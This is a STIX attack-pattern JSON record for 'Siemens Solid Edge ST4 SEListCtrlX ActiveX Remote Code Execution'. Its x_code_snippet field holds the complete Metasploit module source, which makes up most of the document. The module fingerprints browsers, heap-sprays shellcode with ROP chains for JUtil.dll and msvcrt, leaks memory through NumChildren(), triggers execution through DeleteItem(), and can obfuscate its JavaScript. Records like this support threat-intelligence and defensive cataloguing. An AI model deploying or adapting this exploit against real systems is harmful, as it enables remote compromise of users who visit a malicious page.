{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--448a34ae-6dfb-4c8b-b071-119a5d6ccc04",
    "created": "2024-08-14T16:41:55.249329Z",
    "modified": "2024-08-14T16:41:55.249333Z",
    "name": "\"Siemens Solid Edge ST4 SEListCtrlX ActiveX Remote Code Execution\"",
    "description": " This module exploits the SEListCtrlX ActiveX installed with the Siemens Solid Edge product. The vulnerability exists on several APIs provided by the control, where user supplied input is handled as a memory pointer without proper validation, allowing an attacker to read and corrupt memory from the target process. This module abuses the methods NumChildren() and DeleteItem() in order to achieve memory info leak and remote code execution respectively. This module has been tested successfully on IE6-IE9 on Windows XP SP3 and Windows 7 SP1 using Solid Edge 10.4.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/siemens_solid_edge_selistctrlx.rb",
            "external_id": "siemens_solid_edge_selistctrlx.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"9.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :rank       => Rank,\n  #  :classid    => \"{5D6A72E6-C12F-4C72-ABF3-32F6B70EBB0D}\"\n  #})\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Siemens Solid Edge ST4 SEListCtrlX ActiveX Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits the SEListCtrlX ActiveX installed with the Siemens Solid Edge product.\n        The vulnerability exists on several APIs provided by the control, where user supplied input\n        is handled as a memory pointer without proper validation, allowing an attacker to read and\n        corrupt memory from the target process. This module abuses the methods NumChildren() and\n        DeleteItem() in order to achieve memory info leak and remote code execution respectively.\n        This module has been tested successfully on IE6-IE9 on Windows XP SP3 and Windows 7 SP1,\n        using Solid Edge 10.4.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '93696' ],\n          [ 'EDB', '25712' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 906,\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Jutil.dll 104.0.0.82\n          # SEListCtrlX 104.0.0.82\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3', { 'Rop' => nil,  'Offset' => '0x5F4' } ],\n          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,  'Offset' => '0x5F4' } ],\n          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4' } ],\n          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,  'Offset' => '0x5f4' } ],\n          [ 'IE 8 on Windows Vista',  { 'Rop' => :jutil, 'Offset' => '0x5f4' } ],\n          [ 'IE 8 on Windows 7',      { 'Rop' => :jutil, 'Offset' => '0x5f4' } ],\n          [ 'IE 9 on Windows 7',      { 'Rop' => :jutil, 'Offset' => '0x5fe' } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-05-26',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def junk\n    return rand_text_alpha(4).unpack(\"V\").first\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  # JUtil ROP Chain\n  # Jutil Base: 0x1d550000\n  # Stack Pivot: jutil_base + 0x000a5843 # xchg eax, esp # ret\n  # Adjust Stack: jutil_base + 0x00212f17 # pop # pop # ret\n  # 0x1db2e121, # POP EDX # RETN [JUtil.dll]\n  # 0x1d5520ca, # ptr to &VirtualProtect() [IAT JUtil.dll]\n  # 0x1da0ebeb, # MOV EDX,DWORD PTR DS:[EDX] # RETN [JUtil.dll]\n  # 0x1da103d2, # MOV ESI,EDX # RETN [JUtil.dll]\n  # 0x1d70e314, # POP EBP # RETN [JUtil.dll]\n  # 0x1d5fc8e8, # & jmp esp [JUtil.dll]\n  # 0x1d631859, # POP EBX # RETN [JUtil.dll]\n  # 0x00000201, # 0x00000201-> ebx\n  # 0x1d769cf9, # POP EDX # RETN [JUtil.dll]\n  # 0x00000040, # 0x00000040-> edx\n  # 0x1d6d2e50, # POP ECX # RETN [JUtil.dll]\n  # 0x1da45217, # &Writable location [JUtil.dll]\n  # 0x1d632fd1, # POP EDI # RETN [JUtil.dll]\n  # 0x1d6839db, # RETN (ROP NOP) [JUtil.dll]\n  # 0x1d752439, # POP EAX # RETN [JUtil.dll]\n  # 0x90909090, # nop\n  # 0x1da4cfe3, # PUSHAD # RETN [JUtil.dll]\n  def ie9_spray(t, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(t.arch))\n    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(t.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js = %Q|\n\n    function rop_chain(jutil_base){\n      var arr = [\n        Number(Math.floor(Math.random()*0xffffffff)),\n        Number(0x0c0c0c0c),\n        Number(0x0c0c0c0c),\n        Number(0x0c0c0c1c),\n        Number(0x0c0c0c24),\n        Number(0x0c0c0c28),\n        Number(Math.floor(Math.random()*0xffffffff)),\n        Number(Math.floor(Math.random()*0xffffffff)),\n        Number(0x0c0c0c0c),\n        Number(0x0c0c0c3c),\n        jutil_base + Number(0x00212f17),\n        jutil_base + Number(0x000a5843),\n        Number(0x0c0c0c34),\n        jutil_base + Number(0x5de121),\n        jutil_base + Number(0x20ca),\n        jutil_base + Number(0x4bebeb),\n        jutil_base + Number(0x4c03d2),\n        jutil_base + Number(0x1be314),\n        jutil_base + Number(0xac8e8),\n        jutil_base + Number(0xe1859),\n        Number(0x00000201),\n        jutil_base + Number(0x219cf9),\n        Number(0x00000040),\n        jutil_base + Number(0x182e50),\n        jutil_base + Number(0x4f5217),\n        jutil_base + Number(0xe2fd1),\n        jutil_base + Number(0x1339db),\n        jutil_base + Number(0x202439),\n        Number(0x90909090),\n        jutil_base + Number(0x4fcfe3)\n      ];\n      return arr;\n    }\n\n    function d2u(dword){\n      var uni = String.fromCharCode(dword & 0xFFFF);\n      uni += String.fromCharCode(dword>>16);\n      return uni;\n    }\n\n    function tab2uni(tab){\n      var uni = \"\"\n      for(var i=0;i<tab.length;i++){\n        uni += d2u(tab[i]);\n      }\n      return uni;\n    }\n\n    function randomblock(blocksize)\n    {\n      var theblock = \"\";\n      for (var i = 0; i < blocksize; i++)\n      {\n        theblock += Math.floor(Math.random()*90)+10;\n      }\n      return theblock;\n    }\n\n    function tounescape(block)\n    {\n      var blocklen = block.length;\n      var unescapestr = \"\";\n      for (var i = 0; i < blocklen-1; i=i+4)\n      {\n        unescapestr += \"%u\" + block.substring(i,i+4);\n      }\n      return unescapestr;\n    }\n\n    var heap_obj = new heapLib.ie(0x10000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_random_nops}\";\n    var nops = unescape(#{randnop});\n\n    function heap_spray(jutil_base) {\n      while (nops.length < 0x80000) nops += nops;\n      var offset_length = #{t['Offset']};\n      for (var i=0; i < 0x1000; i++) {\n        var padding = unescape(tounescape(randomblock(0x1000)));\n        while (padding.length < 0x1000) padding+= padding;\n        var junk_offset = padding.substring(0, offset_length);\n        var rop = tab2uni(rop_chain(jutil_base));\n        var single_sprayblock = junk_offset + rop + code + nops.substring(0, 0x800 - rop.length -  code.length - junk_offset.length);\n        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n        heap_obj.alloc(sprayblock);\n      }\n    }\n    |\n    return js\n  end\n\n  def ie8_spray(t, p)\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(t.arch))\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(t.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js = %Q|\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    function rop_chain(jutil_base){\n      var arr = [\n        Number(Math.floor(Math.random()*0xffffffff)),\n        Number(0x0c0c0c0c),\n        Number(0x0c0c0c0c),\n        Number(0x0c0c0c1c),\n        Number(0x0c0c0c24),\n        Number(0x0c0c0c28),\n        Number(Math.floor(Math.random()*0xffffffff)),\n        Number(Math.floor(Math.random()*0xffffffff)),\n        Number(0x0c0c0c0c),\n        Number(0x0c0c0c3c),\n        jutil_base + Number(0x00212f17),\n        jutil_base + Number(0x000a5843),\n        Number(0x0c0c0c34),\n        jutil_base + Number(0x5de121),\n        jutil_base + Number(0x20ca),\n        jutil_base + Number(0x4bebeb),\n        jutil_base + Number(0x4c03d2),\n        jutil_base + Number(0x1be314),\n        jutil_base + Number(0xac8e8),\n        jutil_base + Number(0xe1859),\n        Number(0x00000201),\n        jutil_base + Number(0x219cf9),\n        Number(0x00000040),\n        jutil_base + Number(0x182e50),\n        jutil_base + Number(0x4f5217),\n        jutil_base + Number(0xe2fd1),\n        jutil_base + Number(0x1339db),\n        jutil_base + Number(0x202439),\n        Number(0x90909090),\n        jutil_base + Number(0x4fcfe3)\n      ];\n      return arr;\n    }\n\n    function d2u(dword){\n      var uni = String.fromCharCode(dword & 0xFFFF);\n      uni += String.fromCharCode(dword>>16);\n      return uni;\n    }\n\n    function tab2uni(tab){\n      var uni = \"\"\n      for(var i=0;i<tab.length;i++){\n        uni += d2u(tab[i]);\n      }\n      return uni;\n    }\n\n    function heap_spray(jutil_base) {\n      while (nops.length < 0x80000) nops += nops;\n      var offset = nops.substring(0, #{t['Offset']});\n      var rop = tab2uni(rop_chain(jutil_base));\n      var shellcode = offset + rop + code + nops.substring(0, 0x800-rop.length-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      var block = shellcode.substring(0, (0x80000-6)/2);\n      heap_obj.gc();\n      for (var i=1; i < 0x300; i++) {\n        heap_obj.alloc(block);\n      }\n    }\n    |\n    return js\n  end\n\n  def ie6_spray(t, p)\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(t.arch))\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(t.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js = %Q|\n    var heap_obj = new heapLib.ie(0x20000);\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    var code = unescape(\"#{js_code}\");\n\n    function heap_spray() {\n      while (nops.length < 0x80000) nops += nops;\n      var offset = nops.substring(0, #{t['Offset']});\n      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      var block = shellcode.substring(0, (0x80000-6)/2);\n      heap_obj.gc();\n      for (var i=1; i < 0x300; i++) {\n        heap_obj.alloc(block);\n      }\n    }\n    |\n    return js\n  end\n\n  def ie_heap_spray(my_target, p)\n    # Land the payload at 0x0c0c0c0c\n    case my_target\n    when targets[7]\n      # IE 9 on Windows 7\n      js = ie9_spray(my_target, p)\n    when targets[5], targets[6]\n      # IE 8 on Windows 7 and Windows Vista\n      js = ie8_spray(my_target, p)\n    else\n      js = ie6_spray(my_target, p)\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n      @heap_spray_fn = js.sym(\"heap_spray\")\n    else\n      @heap_spray_fn = \"heap_spray\"\n    end\n\n    return js\n  end\n\n  def get_windows_xp_payload\n    fake_memory = [\n        junk,       # junk         # 0c0c0c0c\n        0x0c0c0c0c, # Dereference  # 0c0c0c10\n        0x0c0c0c0c, # Dereference  # 0c0c0c14\n        0x0c0c0c1c, # [0x0c0c0c0c] # 0c0c0c18\n        0x0c0c0c24, # Dereference  # 0c0c0c1c\n        0x0c0c0c28, # Dereference  # 0c0c0c20\n        junk,       # junk         # 0c0c0c24\n        junk,       # junk         # 0c0c0c28\n        0x0c0c0c0c, # Dereference  # 0c0c0c2c\n        0x0c0c0c30, # Dereference  # 0c0c0c30\n        0x0c0c0c38, # new eip      # 0c0c0c34\n    ].pack(\"V*\")\n\n    p = fake_memory + payload.encoded\n\n    return p\n  end\n\n  def get_windows_msvcrt_payload\n    fake_memory = [\n        junk,       # junk         # 0c0c0c0c\n        0x0c0c0c0c, # Dereference  # 0c0c0c10\n        0x0c0c0c0c, # Dereference  # 0c0c0c14\n        0x0c0c0c1c, # [0x0c0c0c0c] # 0c0c0c18\n        0x0c0c0c24, # Dereference  # 0c0c0c1c\n        0x0c0c0c28, # Dereference  # 0c0c0c20\n        junk,       # junk         # 0c0c0c24\n        junk,       # junk         # 0c0c0c28\n        0x0c0c0c0c, # Dereference  # 0c0c0c2c\n        0x0c0c0c3c, # Dereference  # 0c0c0c30\n        0x77c21ef4, # ppr msvcrt   # 0c0c0c34\n        0x77c15ed5, # xchg eax,esp # ret (msvcrt)\n        0x0c0c0c34  # eax value    # 0c0c0c3c\n    ].pack(\"V*\")\n\n    return generate_rop_payload('msvcrt', payload.encoded, {'pivot'=> fake_memory, 'target'=>'xp'})\n  end\n\n  def get_payload(t)\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n    when :msvcrt\n      print_status(\"Using msvcrt ROP\")\n      p = get_windows_msvcrt_payload\n    when :jutil\n      print_status(\"Using JUtil ROP built dynamically...\")\n      p = payload.encoded\n    else\n      print_status(\"Using payload without ROP...\")\n      p = get_windows_xp_payload\n    end\n\n    return p\n  end\n\n  def info_leak_trigger\n    js = <<-EOS\n    <object classid='clsid:5D6A72E6-C12F-4C72-ABF3-32F6B70EBB0D' id='obj' />\n    </object>\n    <script language='javascript'>\n    jutil_address = obj.NumChildren(0x10017018 - 0x0c);\n    jutil_base = jutil_address - 0x49440;\n    #{@heap_spray_fn}(jutil_base);\n    obj.DeleteItem(0x0c0c0c08);\n    </script>\n    EOS\n\n    return js\n  end\n\n  def exec_trigger\n    js = <<-EOS\n    <object classid='clsid:5D6A72E6-C12F-4C72-ABF3-32F6B70EBB0D' id='obj' />\n    </object>\n    <script language='javascript'>\n    #{@heap_spray_fn}();\n    obj.DeleteItem(0x0c0c0c08);\n    </script>\n    EOS\n\n    return js\n  end\n\n  def get_trigger(t)\n    case t['Rop']\n      when :jutil\n        js = info_leak_trigger\n      else\n        js = exec_trigger\n    end\n\n    return js\n  end\n\n  def load_exploit_html(my_target)\n    p  = get_payload(my_target)\n    js = ie_heap_spray(my_target, p)\n    trigger = get_trigger(my_target)\n\n    html = %Q|\n    <html>\n    <head>\n    <script language='javascript'>\n    #{js}\n    </script>\n    </head>\n    <body>\n    #{trigger}\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-26",
    "x_mitre_platforms": [
        "win'"
    ]
}